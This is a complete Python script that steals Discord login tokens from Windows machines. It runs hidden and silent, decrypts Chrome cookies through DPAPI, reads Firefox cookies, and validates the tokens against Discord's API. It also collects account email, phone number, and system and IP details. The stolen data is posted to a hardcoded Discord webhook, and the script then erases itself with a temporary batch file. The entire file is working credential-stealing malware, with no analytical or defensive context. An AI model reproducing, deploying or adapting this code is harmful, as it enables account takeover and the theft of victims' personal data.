import os
import sys
import requests
import socket
import platform
import getpass
import json
import time
from datetime import datetime
import subprocess
import tempfile
import ctypes
import threading
import sqlite3
import shutil
import base64
import winreg

# === CONFIGURATION ===
WEBHOOK_URL = "https://discord.com/api/webhooks/1446737966616547429/tnrCpgYUsP5RjkWocLk_EnQmwjEfEA6vXCPRCtwe80N595UkJRSqF5SZxvNk6ML3tsP6"
DELETE_AFTER_SEND = True
SILENT_MODE = True

# Redirect all output to null
if SILENT_MODE:
    class NullWriter:
        def write(self, text):
            pass
        def flush(self):
            pass
    sys.stdout = NullWriter()
    sys.stderr = NullWriter()

def get_system_info():
    """Get basic system info"""
    try:
        local_ip = socket.gethostbyname(socket.gethostname())
    except:
        local_ip = "Unknown"
    
    return {
        "username": getpass.getuser(),
        "hostname": socket.gethostname(),
        "computer_name": os.getenv('COMPUTERNAME', os.getenv('HOSTNAME', 'Unknown')),
        "local_ip": local_ip,
        "timestamp": datetime.now().isoformat()
    }

def get_public_ip():
    """Get public IP"""
    try:
        response = requests.get('http://checkip.amazonaws.com', timeout=2)
        if response.status_code == 200:
            return response.text.strip()
    except:
        pass
    return "Unknown"

def get_master_key():
    """Get Chrome master key for cookie decryption"""
    try:
        # Chrome local state path
        local_state_path = os.path.join(
            os.getenv('LOCALAPPDATA'), 
            'Google', 'Chrome', 'User Data', 'Local State'
        )
        
        if os.path.exists(local_state_path):
            with open(local_state_path, 'r', encoding='utf-8') as f:
                local_state = json.load(f)
            
            encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
            encrypted_key = encrypted_key[5:]  # Remove DPAPI prefix
            
            # Decrypt with DPAPI
            class DATA_BLOB(ctypes.Structure):
                _fields_ = [('cbData', ctypes.wintypes.DWORD),
                           ('pbData', ctypes.POINTER(ctypes.c_char))]
            
            blob = DATA_BLOB()
            blob.pbData = ctypes.c_char_p(encrypted_key)
            blob.cbData = len(encrypted_key)
            
            out_blob = DATA_BLOB()
            result = ctypes.windll.crypt32.CryptUnprotectData(
                ctypes.byref(blob), None, None, None, None, 0, ctypes.byref(out_blob)
            )
            
            if result:
                decrypted = ctypes.string_at(out_blob.pbData, out_blob.cbData)
                ctypes.windll.kernel32.LocalFree(out_blob.pbData)
                return decrypted
    except:
        pass
    return None

def decrypt_chrome_cookie(encrypted_value, master_key):
    """Decrypt Chrome cookie value"""
    try:
        if encrypted_value[:3] == b'v10':
            iv = encrypted_value[3:15]
            payload = encrypted_value[15:]
            
            from Crypto.Cipher import AES
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted = cipher.decrypt(payload)[:-16]
            return decrypted.decode('utf-8', errors='ignore')
    except:
        pass
    return None

def get_discord_token_from_browser():
    """Get Discord token from browser cookies"""
    tokens = []
    
    if platform.system() != "Windows":
        return tokens
    
    # Get master key for decryption
    master_key = get_master_key()
    
    # Chrome paths to check
    chrome_paths = [
        os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data'),
        os.path.join(os.getenv('APPDATA'), 'Google', 'Chrome', 'User Data'),
    ]
    
    for chrome_base in chrome_paths:
        if not os.path.exists(chrome_base):
            continue
        
        # Check all profiles
        profiles = []
        for item in os.listdir(chrome_base):
            if item == 'Default' or item.startswith('Profile'):
                profiles.append(item)
        
        for profile in profiles:
            cookies_path = os.path.join(chrome_base, profile, 'Cookies')
            if not os.path.exists(cookies_path):
                continue
            
            try:
                # Copy cookies database to temp location
                temp_db = os.path.join(tempfile.gettempdir(), f'chrome_cookies_{profile}.db')
                shutil.copy2(cookies_path, temp_db)
                
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                
                # Query Discord cookies
                cursor.execute("""
                    SELECT name, encrypted_value 
                    FROM cookies 
                    WHERE host_key LIKE '%discord.com%' AND name = 'token'
                """)
                
                for name, encrypted_value in cursor.fetchall():
                    if encrypted_value:
                        token = decrypt_chrome_cookie(encrypted_value, master_key)
                        if token and len(token) > 50:
                            tokens.append(token)
                
                conn.close()
                os.remove(temp_db)
                
            except:
                continue
    
    # Also check Firefox
    firefox_tokens = get_discord_token_from_firefox()
    tokens.extend(firefox_tokens)
    
    # Remove duplicates
    return list(set(tokens))

def get_discord_token_from_firefox():
    """Get Discord token from Firefox"""
    tokens = []
    
    if platform.system() != "Windows":
        return tokens
    
    # Firefox profiles location
    firefox_base = os.path.join(os.getenv('APPDATA'), 'Mozilla', 'Firefox', 'Profiles')
    if not os.path.exists(firefox_base):
        return tokens
    
    # Find profiles
    for profile in os.listdir(firefox_base):
        if profile.endswith('.default-release') or profile.endswith('.default'):
            cookies_path = os.path.join(firefox_base, profile, 'cookies.sqlite')
            if not os.path.exists(cookies_path):
                continue
            
            try:
                temp_db = os.path.join(tempfile.gettempdir(), 'firefox_cookies.db')
                shutil.copy2(cookies_path, temp_db)
                
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                
                cursor.execute("""
                    SELECT name, value 
                    FROM moz_cookies 
                    WHERE host LIKE '%discord.com%' AND name = 'token'
                """)
                
                for name, value in cursor.fetchall():
                    if value and len(value) > 50:
                        tokens.append(value)
                
                conn.close()
                os.remove(temp_db)
                
            except:
                continue
    
    return tokens

def test_discord_token(token):
    """Test if Discord token is valid"""
    if not token or len(token) < 50:
        return False
    
    headers = {
        'Authorization': token,
        'User-Agent': 'Mozilla/5.0'
    }
    
    try:
        response = requests.get('https://discord.com/api/v9/users/@me', 
                              headers=headers, timeout=3)
        return response.status_code == 200
    except:
        return False

def get_discord_account_info(token):
    """Get account info from Discord token"""
    if not token:
        return None
    
    headers = {
        'Authorization': token,
        'User-Agent': 'Mozilla/5.0'
    }
    
    try:
        response = requests.get('https://discord.com/api/v9/users/@me', 
                              headers=headers, timeout=3)
        
        if response.status_code == 200:
            user_data = response.json()
            return {
                "username": user_data.get('username', 'Unknown'),
                "discriminator": user_data.get('discriminator', '0000'),
                "email": user_data.get('email'),
                "phone": user_data.get('phone'),
                "verified": user_data.get('verified', False),
                "mfa_enabled": user_data.get('mfa_enabled', False),
                "premium_type": user_data.get('premium_type', 0),
                "token": token
            }
    except:
        pass
    
    return None

def collect_browser_tokens():
    """Collect Discord tokens from browser and system info"""
    system_info = get_system_info()
    public_ip = get_public_ip()
    
    # Get Discord tokens from browser
    browser_tokens = get_discord_token_from_browser()
    valid_tokens = []
    accounts = []
    
    # Test each token
    for token in browser_tokens:
        if test_discord_token(token):
            valid_tokens.append(token)
            account_info = get_discord_account_info(token)
            if account_info:
                accounts.append(account_info)
    
    # Build data
    data = {
        "timestamp": datetime.now().isoformat(),
        "system": {
            "username": system_info["username"],
            "hostname": system_info["hostname"],
            "computer_name": system_info["computer_name"],
            "local_ip": system_info["local_ip"]
        },
        "network": {
            "public_ip": public_ip
        },
        "discord": {
            "tokens_found_browser": len(browser_tokens),
            "valid_tokens": len(valid_tokens),
            "accounts": accounts
        }
    }
    
    return data

def send_to_discord(webhook_url, data):
    """Send data to Discord"""
    
    # Create message
    message = f"""
**🔐 Discord Token from Browser**

**👤 User:** `{data['system']['username']}`
**💻 Computer:** `{data['system']['computer_name']}`
**🌐 Public IP:** `{data['network']['public_ip']}`
**🔒 Local IP:** `{data['system']['local_ip']}`
**🕐 Time:** {data['timestamp']}

**📊 Token Stats:**
• Browser tokens found: {data['discord']['tokens_found_browser']}
• Valid working tokens: {data['discord']['valid_tokens']}
"""
    
    # Add account info if tokens found
    if data['discord']['accounts']:
        for i, account in enumerate(data['discord']['accounts'], 1):
            message += f"\n**✅ Account {i}:**\n"
            message += f"```\n"
            message += f"Token: {account['token']}\n"
            message += f"User: {account['username']}#{account['discriminator']}\n"
            if account.get('email'):
                message += f"Email: {account['email']}\n"
            if account.get('phone'):
                message += f"Phone: {account['phone']}\n"
            message += f"Verified: {'✅' if account['verified'] else '❌'}\n"
            message += f"MFA: {'✅' if account['mfa_enabled'] else '❌'}\n"
            message += f"```\n"
    else:
        message += "\n**❌ No valid Discord tokens found in browser**\n"
    
    try:
        # Send message
        response = requests.post(webhook_url, json={"content": message}, timeout=10)
        
        # Send as JSON file too
        json_str = json.dumps(data, indent=2, ensure_ascii=False)
        files = {'file': ('browser_tokens.json', json_str.encode('utf-8'), 'application/json')}
        requests.post(webhook_url, files=files, timeout=10)
        
        return True
    except:
        return False

def hide_window():
    """Hide console window"""
    if platform.system() == "Windows":
        try:
            kernel32 = ctypes.WinDLL('kernel32')
            user32 = ctypes.WinDLL('user32')
            hwnd = kernel32.GetConsoleWindow()
            if hwnd:
                user32.ShowWindow(hwnd, 0)
        except:
            pass

def self_delete():
    """Delete script after execution"""
    if not DELETE_AFTER_SEND:
        return
    
    try:
        script_path = os.path.abspath(sys.argv[0])
        
        if platform.system() == "Windows":
            # Simple batch file
            bat_content = '''@echo off
timeout /t 1 /nobreak >nul
del /f /q "{}" >nul 2>&1
if exist "{}" (
    timeout /t 1 /nobreak >nul
    del /f /q "{}" >nul 2>&1
)
del "%~f0" >nul 2>&1
'''.format(script_path, script_path, script_path)
            
            bat_path = os.path.join(tempfile.gettempdir(), 'cleanup.bat')
            with open(bat_path, 'w') as f:
                f.write(bat_content)
            
            subprocess.Popen(['cmd', '/c', bat_path], 
                           shell=True,
                           stdin=subprocess.DEVNULL,
                           stdout=subprocess.DEVNULL,
                           stderr=subprocess.DEVNULL,
                           creationflags=subprocess.CREATE_NO_WINDOW)
    except:
        pass

def main():
    """Main function"""
    hide_window()
    
    # Collect data from browser
    data = collect_browser_tokens()
    
    # Send to Discord
    send_to_discord(WEBHOOK_URL, data)
    
    # Self delete
    if DELETE_AFTER_SEND:
        threading.Thread(target=self_delete, daemon=True).start()

if __name__ == "__main__":
    try:
        main()
    except:
        pass
    
    os._exit(0)
